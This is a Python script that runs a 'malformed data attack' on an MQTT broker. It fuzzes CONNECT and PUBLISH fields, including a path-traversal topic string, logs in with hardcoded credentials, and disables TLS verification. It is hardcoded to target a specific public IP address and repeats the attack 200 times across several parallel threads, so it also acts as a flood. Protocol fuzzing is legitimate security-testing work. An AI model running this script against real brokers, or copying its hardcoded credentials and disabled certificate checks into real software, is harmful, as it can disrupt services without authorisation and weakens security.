import ssl
import sys
import paho.mqtt.client as mqtt
import threading
import time

username = "mqttbroker"
password = "test123"

def on_connect(client, userdata, flags, rc):
    print("Connected flags: ",str(flags),"result code ",str(rc))
##############################################################################################################################################
# function that returns an array of values that might trigger an error. The arrays are related to the type of the value
# to test. If, for example, the value to test is an integer, this function should be called in the following way
# malformed_values(integer=True)

def malformed_values(integer=False, boolean=False, string=False, topic=False):
    if integer == True:
        integer_values = [0, 1, 2, 3, -1,-2,-3,100, -100, 234,256, 0.12, -0.12,0.0000000000000000000000000000, \
            0.000001, \
            89342790812734098172349871230948712093749281374972139471902374097123094871029384709127340987123049710293749128374097239017409237409123749071209347091237490321,\
             -1928349182037498127349871239047092387409723104971230947923749012730497210934871293074923174921379047012347092734]
        return integer_values
    elif boolean == True:
        boolean_values = [True, False, 0, 1, 2, -1,-2]
        return boolean_values
    elif string == True:
        string_values = ["","/","+",".","$","#","&","test", "$topic",\
         "testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest"]
        return string_values
    elif topic == True:
        topic_values = ["","/","//","+","$","+/","$topic","///////", "/../../../../", "#", "/#/#/#"]
        return topic_values
    else:
        return []

##############################################################################################################################################
# custom class for storing errors returned when trying the malformed data attack
class MyError:
    def __init__(self, err_value, err_message):
        self.err_value = err_value
        self.err_message = err_message
    
##############################################################################################################################################
# custom class to store values about the results of the malformed data attack
class Malformed:
    def __init__(self, packet, parameter):
        # the packet under testing (CONNECT, PUBLISH...)
        self.packet = packet
        # the parameter of the packet under testing
        self.parameter = parameter
        # array of MyError objects
        self.errors = []
        # array of values for which there was no error
        self.successes = []

    def add_error(self, error):
        self.errors.append(error)

    def add_success(self, success):
        self.successes.append(success)
        
##############################################################################################################################################
mal_data = []

"""Performs the malformed data attack

Parameters:
    host (str): IP address of the broker
    topic (bool): topic in which we try to perform the attack
    tls_cert (str): The path to the CA certificate used to connect over TLS

Returns:
    mal_data ([Malformed]): an array of Malformed objects containing information about
                            the data used to perform the test and the result (it provides
                            also information about the errors)
"""
def malformed_data(host, version, port, topic, tls_cert, client_cert, client_key): #broker ip,mqtt ver,port,topic,tls certificate realted fields...,creds
    # try malformed data for CONNECT packet
    test_connect_packet(host, version, port, topic, tls_cert, client_cert, client_key)
    # try malformed data for PUBLISH packet
    test_publish_packet(host, version, port, topic, tls_cert, client_cert, client_key)
    # return the results of the test
    return mal_data

##############################################################################################################################################
# Function that tests parameters of the CONNECT packet
def test_connect_packet(host, version, port, topic, tls_cert, client_cert, client_key):
    global mal_data
    client = mqtt.Client(protocol = mqtt.MQTTv5 if version == 5 else mqtt.MQTTv311)
    # initialize a 'mal' variable as a Malformed() object passing the name of the parameter we are going to test
    # in this way all the results are related to such parameter because are in the same object
    mal = Malformed("CONNECT", "client_id")
    # the malformed_values function will return the set of malformed values associated in this case to strings
    for value in malformed_values(string=True):
        print("CONNECT", "client_id",value)
        try:
            if version == 5:
                client.reinitialise(client_id=value, userdata=None)
            else:
                client.reinitialise(client_id=value, clean_session=True, userdata=None)
                
            client.username_pw_set(username, password)
            client.on_connect = on_connect
            client.loop_start()
            # if the path to the CA certificate it will try to connect over TLS
            if tls_cert != None:
                client.tls_set(tls_cert, client_cert, client_key, cert_reqs=ssl.CERT_NONE,
                               tls_version=ssl.PROTOCOL_TLS, ciphers=None)
                client.tls_insecure_set(True)
            if version == 5:
                client.connect(host, port, keepalive=60, bind_address="", clean_start = True)
            else:
                client.connect(host, port, keepalive=60, bind_address="")
            client.publish(topic, "test")
            # if successful we add the value to the 'mal' object as a value which didn't generate any error
            mal.add_success(value)
            client.loop_stop()
        except:
            # if an error occurs, its message will be stored along with the value that caused it in a MyError object
            err = MyError(value, sys.exc_info()[1])
            mal.add_error(err)
    mal_data.append(mal)

    #Try every malformed value for the clean_session value
    mal = Malformed("CONNECT", "clean_session")
    # the malformed_values function will return the set of malformed values associated in this case to booleans
    for value in malformed_values(boolean=True):
        print("CONNECT", "clean_session",value)
        try:
            if version == 5:
                client.reinitialise(userdata=None)
            else:
                client.reinitialise(clean_session=value, userdata=None)
            # if the path to the CA certificate it will try to connect over TLS
            if tls_cert != None:
                client.tls_set(tls_cert, client_cert, client_key, cert_reqs=ssl.CERT_NONE,
                               tls_version=ssl.PROTOCOL_TLS, ciphers=None)
                client.tls_insecure_set(True)
            
            client.username_pw_set(username, password)
            client.on_connect = on_connect
            client.loop_start()
            if version == 5:
                client.connect(host, port, keepalive=60, bind_address="", clean_start = value)
            else:
                client.connect(host, port, keepalive=60, bind_address="")
            
            client.publish(topic, "test")
            # if successful we add the value to the 'mal' object as a value which didn't generate any error
            mal.add_success(value)
            client.loop_stop()
        except:
            # if an error occurs, its message will be stored along with the value that caused it in a MyError object
            err = MyError(value, sys.exc_info()[1])
            mal.add_error(err)
    mal_data.append(mal)

    #Try every malformed value for the userdata value
    mal = Malformed("CONNECT", "userdata")
    # the malformed_values function will return the set of malformed values associated in this case to strings
    for value in malformed_values(string=True):
        print("CONNECT", "userdata",value)
        try:
            if version == 5:
                client.reinitialise(userdata=value)
            else:
                client.reinitialise(clean_session=True, userdata=value)
            # if the path to the CA certificate it will try to connect over TLS
            if tls_cert != None:
                client.tls_set(tls_cert, client_cert, client_key, cert_reqs=ssl.CERT_NONE,
                               tls_version=ssl.PROTOCOL_TLS, ciphers=None)
                client.tls_insecure_set(True)
            client.loop_start()
            client.username_pw_set(username, password)
            client.on_connect = on_connect
            if version == 5:
                client.connect(host, port, keepalive=60, bind_address="", clean_start = True)
            else:
                client.connect(host, port, keepalive=60, bind_address="")
            
            client.publish(topic, "test")
            # if successful we add the value to the 'mal' object as a value which didn't generate any error
            mal.add_success(value)
            client.loop_stop()
        except:
            # if an error occurs, its message will be stored along with the value that caused it in a MyError object
            err = MyError(value, sys.exc_info()[1])
            mal.add_error(err)
    mal_data.append(mal)

    #Try every malformed value for the keepalive value
    mal = Malformed("CONNECT", "keepalive")
    # the malformed_values function will return the set of malformed values associated in this case to integers
    for value in malformed_values(integer=True):
        print("CONNECT", "keepalive",value)
        try:
            if version == 5:
                client.reinitialise(userdata=None)
            else:
                client.reinitialise(clean_session=True, userdata=None)
            # if the path to the CA certificate it will try to connect over TLS
            if tls_cert != None:
                client.tls_set(tls_cert, client_cert, client_key, cert_reqs=ssl.CERT_NONE,
                               tls_version=ssl.PROTOCOL_TLS, ciphers=None)
                client.tls_insecure_set(True)
            client.loop_start()
            client.username_pw_set(username, password)
            client.on_connect = on_connect
            if version == 5:
                client.connect(host, port, keepalive=value, bind_address="", clean_start = True)
            else:    
                client.connect(host, port, keepalive=value, bind_address="")
            
            client.publish(topic, "test")
            # if successful we add the value to the 'mal' object as a value which didn't generate any error
            mal.add_success(value)
            client.loop_stop()
        except:
            # if an error occurs, its message will be stored along with the value that caused it in a MyError object
            err = MyError(value, sys.exc_info()[1])
            mal.add_error(err)
    mal_data.append(mal)


##############################################################################################################################################
# Function that tests parameters of the PUBLISH packet
def test_publish_packet(host, version, port, topic, tls_cert, client_cert, client_key):
    global mal_data
    client = mqtt.Client(protocol = mqtt.MQTTv5 if version == 5 else mqtt.MQTTv311)
    # if the path to the CA certificate it will try to connect over TLS
    if tls_cert != None:
            client.tls_set(tls_cert, client_cert, client_key, cert_reqs=ssl.CERT_NONE,
                            tls_version=ssl.PROTOCOL_TLS, ciphers=None)
            client.tls_insecure_set(True)

    
    client.username_pw_set(username, password)
    client.on_connect = on_connect
    client.loop_start()
    client.connect(host, port, keepalive=60, bind_address="")
    time.sleep(3)
    client.loop_stop()
    #Try every malformed value for the topic value
    mal = Malformed("PUBLISH", "topic")
    # the malformed_values function will return the set of malformed values associated in this case to topics
    for value in malformed_values(topic=True):
        print("PUBLISH", "topic",value)
        try:
            client.publish(value, payload="test")
            # if successful we add the value to the 'mal' object as a value which didn't generate any error
            mal.add_success(value)
        except:
            # if an error occurs, its message will be stored along with the value that caused it in a MyError object
            err = MyError(value, sys.exc_info()[1])
            mal.add_error(err)
    mal_data.append(mal)

    #Try every malformed value for the payload value
    mal = Malformed("PUBLISH", "payload")
    # the malformed_values function will return the set of malformed values associated in this case to strings
    for value in malformed_values(string=True):
        print("PUBLISH", "payload",value)
        try:
            client.publish(topic, value)
            # if successful we add the value to the 'mal' object as a value which didn't generate any error
            mal.add_success(value)
        except:
            # if an error occurs, its message will be stored along with the value that caused it in a MyError object
            err = MyError(value, sys.exc_info()[1])
            mal.add_error(err)
    mal_data.append(mal)

    #Try every malformed value for the qos value
    mal = Malformed("PUBLISH", "qos")
    # the malformed_values function will return the set of malformed values associated in this case to integers
    for value in malformed_values(integer=True):
        print("PUBLISH", "qos", value)
        try:
            client.publish(topic, payload="test", qos=value)
            # if successful we add the value to the 'mal' object as a value which didn't generate any error
            mal.add_success(value)
        except:
            # if an error occurs, its message will be stored along with the value that caused it in a MyError object
            err = MyError(value, sys.exc_info()[1])
            mal.add_error(err)
    mal_data.append(mal)



def malformed_attack():
    for _ in range(200):
        host = "34.125.53.182"
        version = 3
        port = 1883
        topic = "test"
        tls_cert = None
        client_cert = None
        client_key = None
        malformed_data(host,version,port,topic,tls_cert,client_cert,client_key)


# for item in mal_data:
#     print(item.packet)
#     print(item.parameter)
#     print("prining success elements:\n\n")
#     for suc in item.successes:
#         print(suc)
    
#     print("prining error elements:\n\n")
#     for err in item.errors:
#         print(err.err_value)

malformed_attack()

thread1 = threading.Thread(target=malformed_attack)
thread2 = threading.Thread(target=malformed_attack)
thread3 = threading.Thread(target=malformed_attack)
thread4 = threading.Thread(target=malformed_attack)


thread1.start()
thread2.start()
thread3.start()
thread4.start()

thread1.join()
thread2.join()
thread3.join()
thread4.join()
